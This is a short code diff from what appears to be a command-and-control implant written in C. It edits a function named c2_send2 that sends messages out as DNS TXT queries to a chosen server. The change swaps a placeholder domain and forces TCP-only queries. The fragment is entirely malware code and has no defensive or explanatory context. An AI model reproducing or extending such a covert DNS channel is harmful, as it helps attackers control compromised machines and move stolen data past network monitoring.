@@ -435,7 +435,7 @@ int c2_send2(char* msg, int len) {
     pSrvList->AddrArray[0] = numerical_ip;
 
 
-    status = DnsQuery_A("test.edu", DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE, pSrvList, &result, NULL);
+    status = DnsQuery_A("testtesttesttesttesttesttesttesttestte.com", DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE | DNS_QUERY_USE_TCP_ONLY, pSrvList, &result, NULL);
     if (status == ERROR_INVALID_PARAMETER) {
         c2_log("[!] dns invalid param\n");
         return 0;
